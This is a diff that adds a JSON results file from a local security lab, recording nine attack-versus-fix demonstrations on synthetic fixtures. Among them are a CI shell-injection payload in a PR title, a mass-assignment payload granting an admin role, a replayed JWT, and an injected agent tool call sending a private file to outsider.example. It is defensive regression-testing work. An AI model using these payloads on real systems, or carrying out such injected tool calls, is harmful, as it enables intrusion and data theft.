@@ -1,0 +1,180 @@
+{
+  "schema_version": 1,
+  "recorded_at_utc": "2026-09-25T04:55:24.504026+00:00",
+  "runtime": {
+    "python": "3.12.14",
+    "os": "Linux"
+  },
+  "scope": "Synthetic local fixtures; no external target was assessed",
+  "provenance": "Prepared with AI assistance; tests and demonstrations executed locally",
+  "regression_tests": {
+    "run": 49,
+    "failures": 0,
+    "errors": 0,
+    "skipped": 0
+  },
+  "source_sha256": {
+    "lab_agent_tool_boundary.py": "7d28251c33ff8cf9234d75ff96b0026980d622fced16a58837be863b3be8aea7",
+    "lab_api_mass_assignment.py": "82af5c7efb62d59603ff4e4e93ead7b0371aefdf8b02e5000d508b2c1d0bd521",
+    "lab_ci_injection.py": "9159835d604bb36314f084d98058b231e969183be1025d839a4635b25383c93f",
+    "lab_jwt_audience.py": "81b32af1e3a253fdae6a80b18a0c289e5e3072bb45d4b85db2df2a77d21ef99f",
+    "lab_mcp_consent.py": "ef746ee2e759cb3defb9c5dcc3c01f8af00f4382162f25b9335b5da917c8eed4",
+    "lab_oauth_pkce.py": "acb0e69b178dd53a88678cad95e564193a44c807cfd72f7288d4857fd85a2845",
+    "lab_ssrf_redirect.py": "ca71cff41350b9050fd5a148b47e73f7f02a0426a8c2cb9957002835bdcbd967",
+    "lab_tar_traversal.py": "11b583989e1e77193b4df8d09f089e8a3e3335ccc708c598e0f673aa6462add3",
+    "lab_webhook_replay.py": "819f3ca77bb9a762c754562df844c4b641d085f2a304d64fd1ba6a7627b84eb8",
+    "run_all.py": "b029ead7e1a14be86363554f0b8636171f4c5e29cd8ddf1d7790db822e1300cf",
+    "test_security_boundaries.py": "434c081aa07d7af523091c0aad4cf56d793469a576132b7675950e97cee1b7b0"
+  },
+  "demonstrations": [
+    {
+      "lab": "jwt_audience",
+      "attack": "Replay a validly signed token issued for another audience",
+      "token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJhdWQiOiAib3RoZXItc2VydmljZSIsICJleHAiOiAxODAwMDAwMDYwLCAiaXNzIjogImh0dHBzOi8vaXNzdWVyLmV4YW1wbGUiLCAic3ViIjogImRlbW8tdXNlciJ9.ZMNHmWOlHKVytYwpVhVdChalE_gxlY93_FImv6JnTFs",
+      "decoded_claims": {
+        "iss": "https://issuer.example",
+        "aud": "other-service",
+        "sub": "demo-user",
+        "exp": 1800000060
+      },
+      "vulnerable_accepts": true,
+      "fixed_accepts": false,
+      "legitimate_accepts": true
+    },
+    {
+      "lab": "oauth_pkce",
+      "attack": "Redeem an intercepted synthetic authorization code without its verifier",
+      "vulnerable_accepts": true,
+      "fixed_accepts": false,
+      "legitimate_accepts": true,
+      "boundary": "In-memory token-endpoint model; not a full OAuth server"
+    },
+    {
+      "lab": "mcp_consent",
+      "attack": "Reuse upstream consent with a different dynamically registered client",
+      "vulnerable_accepts": true,
+      "fixed_accepts": false,
+      "legitimate_accepts": true,
+      "boundary": "Consent-policy simulation; no real codes, sessions or MCP transport"
+    },
+    {
+      "lab": "ssrf_redirect",
+      "attack": "An allowed HTTP origin redirects to a forbidden fixture origin",
+      "vulnerable_accepts": true,
+      "fixed_accepts": false,
+      "legitimate_accepts": true,
+      "returned_body": "SYNTHETIC_METADATA_ONLY",
+      "backend_requests_before_fix": 1,
+      "backend_requests_after_fix": 1,
+      "boundary": "Real HTTP on two ephemeral 127.0.0.1 ports; no cloud metadata accessed"
+    },
+    {
+      "lab": "ci_injection",
+      "attack": "Interpolate an attacker-controlled PR title into shell source",
+      "payload": "release\"; printf CI_LAB_MARKER > proof.txt; #",
+      "vulnerable_accepts": true,
+      "fixed_accepts": false,
+      "legitimate_accepts": true,
+      "before": {
+        "marker_created": true,
+        "stdout": "release",
+        "marker": "CI_LAB_MARKER"
+      },
+      "after": {
+        "marker_created": false,
+        "stdout": "release\"; printf CI_LAB_MARKER > proof.txt; #",
+        "marker": null
+      },
+      "boundary": "Local POSIX shell; no GitHub Actions runner, tokens or network"
+    },
+    {
+      "lab": "tar_traversal",
+      "attack": "Extract a ../ archive entry outside the intended child directory",
+      "vulnerable_accepts": true,
+      "fixed_accepts": false,
+      "legitimate_accepts": true,
+      "before": {
+        "rejected": false,
+        "escaped_extraction_directory": true,
+        "normal_file_present": false,
+        "symlink_present": false
+      },
+      "after": {
+        "rejected": true,
+        "escaped_extraction_directory": false,
+        "normal_file_present": false,
+        "symlink_present": false
+      },
+      "boundary": "All writes, including the traversal marker, remain in one temporary sandbox"
+    },
+    {
+      "lab": "api_mass_assignment",
+      "attack": "Add a privileged property to an otherwise authorized profile update",
+      "payload": {
+        "display_name": "Alice",
+        "role": "admin"
+      },
+      "vulnerable_accepts": true,
+      "fixed_accepts": false,
+      "legitimate_accepts": true,
+      "before": {
+        "status": 200,
+        "profile": {
+          "id": "alice",
+          "display_name": "Alice",
+          "timezone": "UTC",
+          "role": "admin"
+        }
+      },
+      "after": {
+        "status": 400,
+        "profile": {
+          "id": "alice",
+          "display_name": "Alice",
+          "timezone": "UTC",
+          "role": "member"
+        }
+      },
+      "boundary": "In-process application service; actor identity is a fixture, not authentication"
+    },
+    {
+      "lab": "agent_tool_boundary",
+      "attack": "A compromised planner proposes a tool outside the user-authorized task",
+      "injected_tool_call": {
+        "tool": "send_report",
+        "arguments": {
+          "path": "private/demo.txt",
+          "recipient": "outsider.example"
+        }
+      },
+      "vulnerable_accepts": true,
+      "fixed_accepts": false,
+      "legitimate_accepts": true,
+      "before": {
+        "allowed": true,
+        "simulated_action": {
+          "tool": "send_report",
+          "arguments": {
+            "path": "private/demo.txt",
+            "recipient": "outsider.example"
+          }
+        }
+      },
+      "after": {
+        "allowed": false,
+        "reason": "tool/argument policy"
+      },
+      "boundary": "Policy simulation: no model inference, real tool execution or data transmission"
+    },
+    {
+      "lab": "webhook_replay",
+      "attack": "Replay the same correctly signed event within the freshness window",
+      "vulnerable_accepts": true,
+      "fixed_accepts": false,
+      "legitimate_accepts": true,
+      "vulnerable_business_effects": 2,
+      "fixed_business_effects": 1,
+      "boundary": "In-memory receiver and synthetic event; no webhook is sent"
+    }
+  ]
+}
